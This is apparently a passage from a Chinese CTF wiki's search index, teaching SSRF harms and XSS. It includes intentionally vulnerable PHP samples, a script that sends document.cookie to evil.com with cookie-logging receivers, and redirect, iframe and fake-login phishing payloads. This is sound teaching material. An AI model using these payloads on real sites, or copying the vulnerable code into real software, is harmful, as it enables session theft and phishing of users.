\u2489 \u248a \u248b \u248c \u248d \u248e \u248f \u2490 \u2491 \u2492 \u2493 \u2494 \u2495 \u2496 \u2497 \u2498 \u2499 \u249a \u249b \n\u249c \u249d \u249e \u249f \u24a0 \u24a1 \u24a2 \u24a3 \u24a4 \u24a5 \u24a6 \u24a7 \u24a8 \u24a9 \u24aa \u24ab \u24ac \u24ad \u24ae \u24af \u24b0 \u24b1 \u24b2 \u24b3 \u24b4 \u24b5 \n\u24b6 \u24b7 \u24b8 \u24b9 \u24ba \u24bb \u24bc \u24bd \u24be \u24bf \u24c0 \u24c1 \u24c2 \u24c3 \u24c4 \u24c5 \u24c6 \u24c7 \u24c8 \u24c9 \u24ca \u24cb \u24cc \u24cd \u24ce \u24cf \n\u24d0 \u24d1 \u24d2 \u24d3 \u24d4 \u24d5 \u24d6 \u24d7 \u24d8 \u24d9 \u24da \u24db \u24dc \u24dd \u24de \u24df \u24e0 \u24e1 \u24e2 \u24e3 \u24e4 \u24e5 \u24e6 \u24e7 \u24e8 \u24e9 \n\u24ea \u24eb \u24ec \u24ed \u24ee \u24ef \u24f0 \u24f1 \u24f2 \u24f3 \u24f4 \n\u24f5 \u24f6 \u24f7 \u24f8 \u24f9 \u24fa \u24fb \u24fc \u24fd \u24fe \u24ff\n</code></pre>"},{"location":"web_bak/ctf-wiki-web/SSRF/#_4","title":"\u5371\u5bb3\u00b6","text":"<ul> <li>\u53ef\u4ee5\u5bf9\u5916\u7f51\u3001\u670d\u52a1\u5668\u6240\u5728\u5185\u7f51\u3001\u672c\u5730\u8fdb\u884c\u7aef\u53e3\u626b\u63cf\uff0c\u83b7\u53d6\u4e00\u4e9b\u670d\u52a1\u7684 banner \u4fe1\u606f;</li> <li>\u653b\u51fb\u8fd0\u884c\u5728\u5185\u7f51\u6216\u672c\u5730\u7684\u5e94\u7528\u7a0b\u5e8f\uff08\u6bd4\u5982\u6ea2\u51fa\uff09;</li> <li>\u5bf9\u5185\u7f51 web \u5e94\u7528\u8fdb\u884c\u6307\u7eb9\u8bc6\u522b\uff0c\u901a\u8fc7\u8bbf\u95ee\u9ed8\u8ba4\u6587\u4ef6\u5b9e\u73b0;</li> <li>\u653b\u51fb\u5185\u5916\u7f51\u7684 web \u5e94\u7528\uff0c\u4e3b\u8981\u662f\u4f7f\u7528 get \u53c2\u6570\u5c31\u53ef\u4ee5\u5b9e\u73b0\u7684\u653b\u51fb\uff08\u6bd4\u5982 struts2\uff0csqli \u7b49\uff09;</li> <li>\u5229\u7528 file \u534f\u8bae\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u7b49\u3002</li> </ul>"},{"location":"web_bak/ctf-wiki-web/SSRF/#_5","title":"\u53c2\u8003\u8d44\u6599\u00b6","text":"<ul> <li>\u300aBuild Your SSRF EXP Autowork\u300b\u732a\u732a\u4fa0</li> <li>\u817e\u8baf\u67d0\u5904 SSRF \u6f0f\u6d1e\uff08\u975e\u5e38\u597d\u7684\u5229\u7528\u70b9\uff09\u9644\u5229\u7528\u811a\u672c</li> <li>bilibili \u67d0\u5206\u7ad9\u4ece\u4fe1\u606f\u6cc4\u9732\u5230 ssrf \u518d\u5230\u547d\u4ee4\u6267\u884c</li> </ul>"},{"location":"web_bak/ctf-wiki-web/XSS/","title":"XSS","text":""},{"location":"web_bak/ctf-wiki-web/XSS/#xss","title":"XSS \u7b80\u4ecb\u00b6","text":"<p>\u8de8\u7ad9\u811a\u672c\uff08Cross-Site Scripting\uff0cXSS\uff09\u662f\u4e00\u79cd\u7ecf\u5e38\u51fa\u73b0\u5728 WEB \u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u8ba1\u7b97\u673a\u5b89\u5168\u6f0f\u6d1e\uff0c\u662f\u7531\u4e8e WEB \u5e94\u7528\u7a0b\u5e8f\u5bf9\u7528\u6237\u7684\u8f93\u5165\u8fc7\u6ee4\u4e0d\u8db3\u800c\u4ea7\u751f\u7684\u3002\u653b\u51fb\u8005\u5229\u7528\u7f51\u7ad9\u6f0f\u6d1e\u628a\u6076\u610f\u7684\u811a\u672c\u4ee3\u7801\u6ce8\u5165\u5230\u7f51\u9875\u4e2d\uff0c\u5f53\u5176\u4ed6\u7528\u6237\u6d4f\u89c8\u8fd9\u4e9b\u7f51\u9875\u65f6\uff0c\u5c31\u4f1a\u6267\u884c\u5176\u4e2d\u7684\u6076\u610f\u4ee3\u7801\uff0c\u5bf9\u53d7\u5bb3\u7528\u6237\u53ef\u80fd\u91c7\u53d6 Cookies \u8d44\u6599\u7a83\u53d6\u3001\u4f1a\u8bdd\u52ab\u6301\u3001\u9493\u9c7c\u6b3a\u9a97\u7b49\u5404\u79cd\u653b\u51fb\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#xss_1","title":"\u53cd\u5c04\u578b XSS\u00b6","text":"<p>\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\uff08Reflected Cross-Site Scripting\uff09\u662f\u6700\u5e38\u89c1\uff0c\u4e5f\u662f\u4f7f\u7528\u6700\u5e7f\u7684\u4e00\u79cd\uff0c\u53ef\u5c06\u6076\u610f\u811a\u672c\u9644\u52a0\u5230 URL \u5730\u5740\u7684\u53c2\u6570\u4e2d\u3002</p> <p>\u53cd\u5c04\u578b XSS \u7684\u5229\u7528\u4e00\u822c\u662f\u653b\u51fb\u8005\u901a\u8fc7\u7279\u5b9a\u624b\u6cd5\uff08\u5982\u7535\u5b50\u90ae\u4ef6\uff09\uff0c\u8bf1\u4f7f\u7528\u6237\u53bb\u8bbf\u95ee\u4e00\u4e2a\u5305\u542b\u6076\u610f\u4ee3\u7801\u7684 URL\uff0c\u5f53\u53d7\u5bb3\u8005\u70b9\u51fb\u8fd9\u4e9b\u4e13\u95e8\u8bbe\u8ba1\u7684\u94fe\u63a5\u7684\u65f6\u5019\uff0c\u6076\u610f\u4ee3\u7801\u4f1a\u76f4\u63a5\u5728\u53d7\u5bb3\u8005\u4e3b\u673a\u4e0a\u7684\u6d4f\u89c8\u5668\u6267\u884c\u3002\u6b64\u7c7b XSS \u901a\u5e38\u51fa\u73b0\u5728\u7f51\u7ad9\u7684\u641c\u7d22\u680f\u3001\u7528\u6237\u767b\u5f55\u53e3\u7b49\u5730\u65b9\uff0c\u5e38\u7528\u6765\u7a83\u53d6\u5ba2\u6237\u7aef Cookies \u6216\u8fdb\u884c\u9493\u9c7c\u6b3a\u9a97\u3002</p> <p>\u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a</p> <p><pre><code>&lt;?php \n// Is there any input? \nif( array_key_exists( \"name\", $_GET ) &amp;&amp; $_GET[ 'name' ] != NULL ) { \n    // Feedback for end user \n    echo '&lt;pre&gt;Hello ' . $_GET[ 'name' ] . '&lt;/pre&gt;'; \n} \n?&gt;\n</code></pre> \u53ef\u4ee5\u770b\u5230\uff0c\u4ee3\u7801\u76f4\u63a5\u5f15\u7528\u4e86<code>name</code>\u53c2\u6570\uff0c\u5e76\u6ca1\u6709\u505a\u4efb\u4f55\u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u5b58\u5728\u660e\u663e\u7684 XSS \u6f0f\u6d1e\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#xss_2","title":"\u6301\u4e45\u578b XSS\u00b6","text":"<p>\u6301\u4e45\u578b\u8de8\u7ad9\u811a\u672c\uff08Persistent Cross-Site Scripting\uff09\u4e5f\u7b49\u540c\u4e8e\u5b58\u50a8\u578b\u8de8\u7ad9\u811a\u672c\uff08Stored Cross-Site Scripting\uff09\u3002</p> <p>\u6b64\u7c7b XSS \u4e0d\u9700\u8981\u7528\u6237\u5355\u51fb\u7279\u5b9a URL \u5c31\u80fd\u6267\u884c\u8de8\u7ad9\u811a\u672c\uff0c\u653b\u51fb\u8005\u4e8b\u5148\u5c06\u6076\u610f\u4ee3\u7801\u4e0a\u4f20\u6216\u50a8\u5b58\u5230\u6f0f\u6d1e\u670d\u52a1\u5668\u4e2d\uff0c\u53ea\u8981\u53d7\u5bb3\u8005\u6d4f\u89c8\u5305\u542b\u6b64\u6076\u610f\u4ee3\u7801\u7684\u9875\u9762\u5c31\u4f1a\u6267\u884c\u6076\u610f\u4ee3\u7801\u3002\u6301\u4e45\u578b XSS \u4e00\u822c\u51fa\u73b0\u5728\u7f51\u7ad9\u7559\u8a00\u3001\u8bc4\u8bba\u3001\u535a\u5ba2\u65e5\u5fd7\u7b49\u4ea4\u4e92\u5904\uff0c\u6076\u610f\u811a\u672c\u5b58\u50a8\u5230\u5ba2\u6237\u7aef\u6216\u8005\u670d\u52a1\u7aef\u7684\u6570\u636e\u5e93\u4e2d\u3002</p> <p>\u670d\u52a1\u5668\u7aef\u4ee3\u7801\uff1a</p> <p><pre><code>&lt;?php\n  if( isset( $_POST[ 'btnSign' ] ) ) {\n    // Get input\n    $message = trim( $_POST[ 'mtxMessage' ] );\n    $name    = trim( $_POST[ 'txtName' ] );\n    // Sanitize message input\n    $message = stripslashes( $message );\n    $message = mysql_real_escape_string( $message );\n    // Sanitize name input\n    $name = mysql_real_escape_string( $name );\n    // Update database\n    $query  = \"INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );\";\n    $result = mysql_query( $query ) or die( '&lt;pre&gt;' . mysql_error() . '&lt;/pre&gt;' );\n    //mysql_close(); }\n?&gt;\n</code></pre> \u4ee3\u7801\u53ea\u5bf9\u4e00\u4e9b\u7a7a\u767d\u7b26\u3001\u7279\u6b8a\u7b26\u53f7\u3001\u53cd\u659c\u6760\u8fdb\u884c\u4e86\u5220\u9664\u6216\u8f6c\u4e49\uff0c\u6ca1\u6709\u505a XSS \u7684\u8fc7\u6ee4\u548c\u68c0\u67e5\uff0c\u4e14\u5b58\u50a8\u5728\u6570\u636e\u5e93\u4e2d\uff0c\u660e\u663e\u5b58\u5728\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#dom-xss","title":"DOM XSS\u00b6","text":"<p>\u4f20\u7edf\u7684 XSS \u6f0f\u6d1e\u4e00\u822c\u51fa\u73b0\u5728\u670d\u52a1\u5668\u7aef\u4ee3\u7801\u4e2d\uff0c\u800c DOM-Based XSS \u662f\u57fa\u4e8e DOM \u6587\u6863\u5bf9\u8c61\u6a21\u578b\u7684\u4e00\u79cd\u6f0f\u6d1e\uff0c\u6240\u4ee5\uff0c\u53d7\u5ba2\u6237\u7aef\u6d4f\u89c8\u5668\u7684\u811a\u672c\u4ee3\u7801\u6240\u5f71\u54cd\u3002\u5ba2\u6237\u7aef JavaScript \u53ef\u4ee5\u8bbf\u95ee\u6d4f\u89c8\u5668\u7684 DOM \u6587\u672c\u5bf9\u8c61\u6a21\u578b\uff0c\u56e0\u6b64\u80fd\u591f\u51b3\u5b9a\u7528\u4e8e\u52a0\u8f7d\u5f53\u524d\u9875\u9762\u7684 URL\u3002\u6362\u53e5\u8bdd\u8bf4\uff0c\u5ba2\u6237\u7aef\u7684\u811a\u672c\u7a0b\u5e8f\u53ef\u4ee5\u901a\u8fc7 DOM \u52a8\u6001\u5730\u68c0\u67e5\u548c\u4fee\u6539\u9875\u9762\u5185\u5bb9\uff0c\u5b83\u4e0d\u4f9d\u8d56\u4e8e\u670d\u52a1\u5668\u7aef\u7684\u6570\u636e\uff0c\u800c\u4ece\u5ba2\u6237\u7aef\u83b7\u5f97 DOM \u4e2d\u7684\u6570\u636e\uff08\u5982\u4ece URL \u4e2d\u63d0\u53d6\u6570\u636e\uff09\u5e76\u5728\u672c\u5730\u6267\u884c\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u6d4f\u89c8\u5668\u7528\u6237\u53ef\u4ee5\u64cd\u7eb5 DOM \u4e2d\u7684\u4e00\u4e9b\u5bf9\u8c61\uff0c\u4f8b\u5982 URL\u3001location \u7b49\u3002\u7528\u6237\u5728\u5ba2\u6237\u7aef\u8f93\u5165\u7684\u6570\u636e\u5982\u679c\u5305\u542b\u4e86\u6076\u610f JavaScript \u811a\u672c\uff0c\u800c\u8fd9\u4e9b\u811a\u672c\u6ca1\u6709\u7ecf\u8fc7\u9002\u5f53\u7684\u8fc7\u6ee4\u548c\u6d88\u6bd2\uff0c\u90a3\u4e48\u5e94\u7528\u7a0b\u5e8f\u5c31\u53ef\u80fd\u53d7\u5230\u57fa\u4e8e DOM \u7684 XSS \u653b\u51fb\u3002</p> <p>HTML \u4ee3\u7801\uff1a</p> <p><pre><code>&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;DOM-XSS test&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;script&gt;\n      var a=document.URL;\n      document.write(a.substring(a.indexOf(\"a=\")+2,a.length));\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> \u5c06\u4ee3\u7801\u4fdd\u5b58\u5728 domXSS.html \u4e2d\uff0c\u6d4f\u89c8\u5668\u8bbf\u95ee\uff1a <pre><code>http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert('XSS')&lt;/script&gt;\n</code></pre> \u5373\u53ef\u89e6\u53d1 XSS \u6f0f\u6d1e\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#xss_3","title":"XSS \u5229\u7528\u65b9\u5f0f\u00b6","text":""},{"location":"web_bak/ctf-wiki-web/XSS/#cookies","title":"Cookies \u7a83\u53d6\u00b6","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u4ee3\u7801\u83b7\u53d6\u5ba2\u6237\u7aef\u7684 Cookies \u4fe1\u606f\uff1a</p> <p><pre><code>&lt;script&gt;\ndocument.location=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie\nnew Image().src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie\n&lt;/script&gt;\n&lt;img src=\"http://www.evil.com/cookie.asp?cookie=\"+document.cookie&gt;&lt;/img&gt;\n</code></pre> \u5728\u8fdc\u7a0b\u670d\u52a1\u5668\u4e0a\uff0c\u6709\u4e00\u4e2a\u63a5\u53d7\u548c\u8bb0\u5f55 Cookies \u4fe1\u606f\u7684\u6587\u4ef6\uff0c\u793a\u4f8b\u5982\u4e0b\uff1a <pre><code>&lt;%\n  msg=Request.ServerVariables(\"QUERY_STRING\")\n  testfile=Server.MapPath(\"cookie.txt\")\n  set fs=server.CreateObject(\"Scripting.filesystemobject\")\n  set thisfile=fs.OpenTextFile(testfile,8,True,0)\n  thisfile.Writeline(\"\"&amp;msg&amp; \"\")\n  thisfile.close\n  set fs=nothing\n%&gt;\n</code></pre></p> <p><pre><code>&lt;?php\n$cookie = $_GET['cookie'];\n$log = fopen(\"cookie.txt\", \"a\");\nfwrite($log, $cookie . \"\\n\");\nfclose($log);\n?&gt;\n</code></pre> \u653b\u51fb\u8005\u5728\u83b7\u53d6\u5230 Cookies \u4e4b\u540e\uff0c\u901a\u8fc7\u4fee\u6539\u672c\u673a\u6d4f\u89c8\u5668\u7684 Cookies\uff0c\u5373\u53ef\u767b\u5f55\u53d7\u5bb3\u8005\u7684\u8d26\u6237\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#_1","title":"\u4f1a\u8bdd\u52ab\u6301\u00b6","text":"<p>\u7531\u4e8e\u4f7f\u7528 Cookies \u5b58\u5728\u4e00\u5b9a\u7684\u5b89\u5168\u7f3a\u9677\uff0c\u56e0\u6b64\uff0c\u5f00\u53d1\u8005\u5f00\u59cb\u4f7f\u7528\u4e00\u4e9b\u66f4\u4e3a\u5b89\u5168\u7684\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u5982 Session\u3002\u5728 Session \u673a\u5236\u4e2d\uff0c\u5ba2\u6237\u7aef\u548c\u670d\u52a1\u7aef\u901a\u8fc7\u6807\u8bc6\u7b26\u6765\u8bc6\u522b\u7528\u6237\u8eab\u4efd\u548c\u7ef4\u6301\u4f1a\u8bdd\uff0c\u4f46\u8fd9\u4e2a\u6807\u8bc6\u7b26\u4e5f\u6709\u88ab\u5176\u4ed6\u4eba\u5229\u7528\u7684\u53ef\u80fd\u3002\u4f1a\u8bdd\u52ab\u6301\u7684\u672c\u8d28\u662f\u5728\u653b\u51fb\u4e2d\u5e26\u4e0a\u4e86 Cookies \u5e76\u53d1\u9001\u5230\u4e86\u670d\u52a1\u7aef\u3002</p> <p>\u5982\u67d0 CMS \u7684\u7559\u8a00\u7cfb\u7edf\u5b58\u5728\u4e00\u4e2a\u5b58\u50a8\u578b XSS \u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u628a XSS \u4ee3\u7801\u5199\u8fdb\u7559\u8a00\u4fe1\u606f\u4e2d\uff0c\u5f53\u7ba1\u7406\u5458\u767b\u5f55\u540e\u53f0\u5e76\u67e5\u770b\u662f\uff0c\u4fbf\u4f1a\u89e6\u53d1 XSS \u6f0f\u6d1e\uff0c\u7531\u4e8e XSS \u662f\u5728\u540e\u53f0\u89e6\u53d1\u7684\uff0c\u6240\u4ee5\u653b\u51fb\u7684\u5bf9\u8c61\u662f\u7ba1\u7406\u5458\uff0c\u901a\u8fc7\u6ce8\u5165 JavaScript \u4ee3\u7801\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u52ab\u6301\u7ba1\u7406\u5458\u4f1a\u8bdd\u6267\u884c\u67d0\u4e9b\u64cd\u4f5c\uff0c\u4ece\u800c\u8fbe\u5230\u63d0\u5347\u6743\u9650\u7684\u76ee\u7684\u3002</p> <p>\u6bd4\u5982\uff0c\u653b\u51fb\u8005\u60f3\u5229\u7528 XSS \u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u53ea\u9700\u8981\u901a\u8fc7\u4e4b\u524d\u7684\u4ee3\u7801\u5ba1\u8ba1\u6216\u5176\u4ed6\u65b9\u5f0f\uff0c\u622a\u53d6\u5230\u6dfb\u52a0\u7ba1\u7406\u5458\u8d26\u53f7\u65f6\u7684 HTTP \u8bf7\u6c42\u4fe1\u606f\uff0c\u7136\u540e\u4f7f\u7528 XMLHTTP \u5bf9\u8c61\u5728\u540e\u53f0\u53d1\u9001\u4e00\u4e2a HTTP \u8bf7\u6c42\u5373\u53ef\uff0c\u7531\u4e8e\u8bf7\u6c42\u5e26\u4e0a\u4e86\u88ab\u653b\u51fb\u8005\u7684 Cookies\uff0c\u5e76\u4e00\u540c\u53d1\u9001\u5230\u670d\u52a1\u7aef\uff0c\u5373\u53ef\u5b9e\u73b0\u6dfb\u52a0\u4e00\u4e2a\u7ba1\u7406\u5458\u8d26\u6237\u7684\u64cd\u4f5c\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#_2","title":"\u9493\u9c7c\u00b6","text":"<p>\u91cd\u5b9a\u5411\u9493\u9c7c</p> <p>\u628a\u5f53\u524d\u9875\u9762\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a\u9493\u9c7c\u9875\u9762\u3002</p> <p><pre><code>http://www.bug.com/index.php?search=\"'&gt;&lt;script&gt;document.location.href=\"http://www.evil.com\"&lt;/script&gt;\n</code></pre> HTML \u6ce8\u5165\u5f0f\u9493\u9c7c \u4f7f\u7528 XSS \u6f0f\u6d1e\u6ce8\u5165 HTML \u6216 JavaScript \u4ee3\u7801\u5230\u9875\u9762\u4e2d\u3002</p> <p><pre><code>http://www.bug.com/index.php?search=\"'&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=\"text-align:center;\"&gt;&lt;form Method=\"POST\" Action=\"phishing.php\" Name=\"form\"&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=\"login\" /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=\"Password\" type=\"password\" /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=\"Valid\" value=\"Ok\" type=\"submit\" /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> \u8be5\u6bb5\u4ee3\u7801\u4f1a\u5728\u6b63\u5e38\u9875\u9762\u4e2d\u5d4c\u5165\u4e00\u4e2a Form \u8868\u5355\u3002 iframe \u9493\u9c7c</p> <p>\u8fd9\u79cd\u65b9\u5f0f\u662f\u901a\u8fc7<code>&lt;iframe&gt;</code>\u6807\u7b7e\u5d4c\u5165\u8fdc\u7a0b\u57df\u7684\u4e00\u4e2a\u9875\u9762\u5b9e\u65bd\u9493\u9c7c\u3002</p> <p><pre><code>http://www.bug.com/index.php?search='&gt;&lt;iframe src=\"http://www.evil.com\" height=\"100%\" width=\"100%\"&lt;/iframe&gt;\n</code></pre> Flash \u9493\u9c7c * \u5c06\u6784\u9020\u597d\u7684 Flash \u6587\u4ef6\u4f20\u5165\u670d\u52a1\u5668\uff0c\u5728\u76ee\u6807\u7f51\u7ad9\u7528<code>&lt;object&gt;</code>\u6216<code>&lt;embed&gt;</code>\u6807\u7b7e\u5f15\u7528\u5373\u53ef\u3002</p> <p>\u9ad8\u7ea7\u9493\u9c7c\u6280\u672f</p> <ul> <li>\u6ce8\u5165\u4ee3\u7801\u52ab\u6301 HTML \u8868\u5355\u3001\u4f7f\u7528 JavaScript \u7f16\u5199\u952e\u76d8\u8bb0\u5f55\u5668\u7b49\u3002</li> </ul>"},{"location":"web_bak/ctf-wiki-web/XSS/#_3","title":"\u7f51\u9875\u6302\u9a6c\u00b6","text":"<p>\u4e00\u822c\u90fd\u662f\u901a\u8fc7\u7be1\u6539\u7f51\u9875\u7684\u65b9\u5f0f\u6765\u5b9e\u73b0\u7684\uff0c\u5982\u5728 XSS \u4e2d\u4f7f\u7528<code>&lt;iframe&gt;</code>\u6807\u7b7e\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#dos-ddos","title":"DOS \u4e0e DDOS\u00b6","text":"<p>\u6ce8\u5165\u6076\u610f JavaScript \u4ee3\u7801\uff0c\u53ef\u80fd\u4f1a\u5f15\u8d77\u4e00\u4e9b\u62d2\u7edd\u670d\u52a1\u653b\u51fb\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#xss_4","title":"XSS \u8815\u866b\u00b6","text":"<p>\u901a\u8fc7\u7cbe\u5fc3\u6784\u9020\u7684 XSS \u4ee3\u7801\uff0c\u53ef\u4ee5\u5b9e\u73b0\u975e\u6cd5\u8f6c\u8d26\u3001\u7be1\u6539\u4fe1\u606f\u3001\u5220\u9664\u6587\u7ae0\u3001\u81ea\u6211\u590d\u5236\u7b49\u8bf8\u591a\u529f\u80fd\u3002</p>"},{"location":"web_bak/ctf-wiki-web/XSS/#self-xss","title":"Self-XSS \u53d8\u5e9f\u4e3a\u5b9d\u7684\u573a\u666f\u00b6","text":"<p>Self-XSS \u987e\u540d\u601d\u4e49\uff0c\u5c31\u662f\u4e00\u4e2a\u5177\u6709 XSS \u6f0f\u6d1e\u7684\u70b9\u53ea\u80fd\u7531\u653b\u51fb\u8005\u672c\u8eab\u89e6\u53d1\uff0c\u5373\u81ea\u5df1\u6253\u81ea\u5df1\u7684\u653b\u51fb\u3002\u6bd4\u5982\u4e2a\u4eba\u9690\u79c1\u7684\u8f93\u5165\u70b9\u5b58\u5728 XSS\u3002\u4f46\u662f\u7531\u4e8e\u8fd9\u4e2a\u9690\u79c1\u4fe1\u606f\u53ea\u80fd\u7531\u7528\u6237\u672c\u4eba\u67e5\u770b\u4e5f\u5c31\u65e0\u6cd5\u7528\u4e8e\u653b\u51fb\u5176\u4ed6\u4eba\u3002\u8fd9\u7c7b\u6f0f\u6d1e\u901a\u5e38\u5371\u5bb3\u5f88\u5c0f\uff0c\u663e\u5f97\u6709\u4e9b\u9e21\u808b\u3002\u4f46\u662f\u5728\u4e00\u4e9b\u5177\u4f53\u7684\u573a\u666f\u4e0b\uff0c\u7ed3\u5408\u5176\u4ed6\u6f0f\u6d1e\uff08\u6bd4\u5982 CSRF \uff09\u5c31\u80fd\u5c06 Self-XSS \u8f6c\u53d8\u4e3a\u5177\u6709\u5371\u5bb3\u7684\u6f0f\u6d1e\u3002\u4e0b\u9762\u5c06\u603b\u7ed3\u4e00\u4e9b\u5e38\u89c1\u53ef\u5229\u7528 Self-XSS \u7684\u573a\u666f\u3002</p> <ul> <li>\u767b\u5f55\u767b\u51fa\u5b58\u5728 CSRF\uff0c\u4e2a\u4eba\u4fe1\u606f\u5b58\u5728 Self-XSS\uff0c\u7b2c\u4e09\u65b9\u767b\u5f55</li> </ul> <p>\u8fd9\u79cd\u573a\u666f\u4e00\u822c\u7684\u5229\u7528\u6d41\u7a0b\u662f\u9996\u5148\u653b\u51fb\u8005\u5728\u4e2a\u4eba\u4fe1\u606f XSS \u70b9\u6ce8\u5165 Payload\uff0c\u7136\u540e\u653b\u51fb\u8005\u5236\u9020\u4e00\u4e2a\u6076\u610f\u9875\u9762\u8bf1\u5bfc\u53d7\u5bb3\u8005\u8bbf\u95ee\uff0c\u6076\u610f\u9875\u9762\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <ol> <li>\u6076\u610f\u9875\u9762\u6267\u884c\u5229\u7528 CSRF \u8ba9\u53d7\u5bb3\u8005\u767b\u5f55\u653b\u51fb\u8005\u7684\u4e2a\u4eba\u4fe1\u606f\u4f4d\u7f6e\uff0c\u89e6\u53d1 XSS payload</li> <li>JavaScript Payload \u751f\u6210<code>&lt;iframe&gt;</code>\u6807\u7b7e\uff0c\u5e76\u5728\u6846\u67b6\u5185\u6267\u884c\u4ee5\u4e0b\u8fd9\u4e9b\u64cd\u4f5c</li> <li>\u8ba9\u53d7\u5bb3\u8005\u767b\u51fa\u653b\u51fb\u8005\u7684\u8d26\u53f7</li> <li>\u7136\u540e\u4f7f\u5f97\u53d7\u5bb3\u8005\u901a\u8fc7 CSRF \u767b\u5f55\u5230\u81ea\u5df1\u7684\u8d26\u6237\u4e2a\u4eba\u4fe1\u606f\u754c\u9762</li> <li>\u653b\u51fb\u8005\u4ece\u9875\u9762\u63d0\u53d6 CSRF Token</li> <li>\u7136\u540e\u53ef\u4ee5\u4f7f\u7528 CSRF Token \u63d0\u4ea4\u4fee\u6539\u7528\u6237\u7684\u4e2a\u4eba\u4fe1\u606f</li> </ol> <p>\u8fd9\u79cd\u653b\u51fb\u6d41\u7a0b\u9700\u8981\u6ce8\u610f\u51e0\u4e2a\u5730\u65b9\uff1a\u7b2c\u4e09\u6b65\u767b\u5f55\u662f\u4e0d\u9700\u8981\u7528\u6237\u4ea4\u4e92\u7684\uff0c\u5229\u7528 Google Sign In \u7b49\u975e\u5bc6\u7801\u767b\u5f55\u65b9\u5f0f\u767b\u5f55\uff1bX-Frame-Options\u9700\u8981\u88ab\u8bbe\u7f6e\u4e3a\u540c\u6e90\uff08\u8be5\u9875\u9762\u53ef\u4ee5\u5728\u76f8\u540c\u57df\u540d\u9875\u9762\u7684<code>iframe</code>\u4e2d\u5c55\u793a \uff09</p> <ul> <li>\u767b\u5f55\u5b58\u5728 CSRF\uff0c\u8d26\u6237\u4fe1\u606f\u5b58\u5728 Self-XSS\uff0cOAUTH \u8ba4\u8bc1</li> <li>\u8ba9\u7528\u6237\u9000\u51fa\u8d26\u6237\u9875\u9762\uff0c\u4f46\u662f\u4e0d\u9000\u51fa OAUTH \u7684\u6388\u6743\u9875\u9762\uff0c\u8fd9\u662f\u4e3a\u4e86\u4fdd\u8bc1\u7528\u6237\u80fd\u91cd\u65b0\u767b\u5f55\u5176\u8d26\u6237\u9875\u9762</li> <li>\u8ba9\u7528\u6237\u767b\u5f55\u6211\u4eec\u7684\u8d26\u6237\u9875\u9762\u51fa\u73b0 XSS\uff0c\u5229\u7528 \u4f7f\u7528<code>&lt;iframe&gt;</code>\u6807\u7b7e\u7b49\u6267\u884c\u6076\u610f\u4ee3\u7801</li> <li>\u767b\u5f55\u56de\u4ed6\u4eec\u5404\u81ea\u7684\u8d26\u6237\uff0c\u4f46\u662f\u6211\u4eec\u7684 XSS \u5df2\u7ecf\u7a83\u53d6\u5230 Session</li> </ul>"},{"location":"web_bak/ctf-wiki-web/%E7%AE%80%E4%BB%8B/","title":"Introduction zh","text":"<p>EN|ZH\u968f\u7740 WEB 2.0\u3001\u793e\u4ea4\u7f51\u7edc\u3001\u5fae\u535a\u7b49\u7b49\u4e00\u7cfb\u5217\u65b0\u578b\u7684\u4e92\u8054\u7f51\u4ea7\u54c1\u7684\u8bde\u751f\uff0c\u57fa\u4e8e WEB \u73af\u5883\u7684\u4e92\u8054\u7f51\u5e94\u7528\u8d8a\u6765\u8d8a\u5e7f\u6cdb\uff0c\u4f01\u4e1a\u4fe1\u606f\u5316\u7684\u8fc7\u7a0b\u4e2d\u5404\u79cd\u5e94\u7528\u90fd\u67b6\u8bbe\u5728 WEB \u5e73\u53f0\u4e0a\uff0cWEB \u4e1a\u52a1\u7684\u8fc5\u901f\u53d1\u5c55\u4e5f\u5f15\u8d77\u9ed1\u5ba2\u4eec\u7684\u5f3a\u70c8\u5173\u6ce8\uff0c\u63a5\u8e35\u800c\u81f3\u7684\u5c31\u662f WEB \u5b89\u5168\u5a01\u80c1\u7684\u51f8\u663e\uff0c\u9ed1\u5ba2\u5229\u7528\u7f51\u7ad9\u64cd\u4f5c\u7cfb\u7edf\u7684\u6f0f\u6d1e\u548c WEB \u670d\u52a1\u7a0b\u5e8f\u7684\u6f0f\u6d1e\u5f97\u5230 WEB 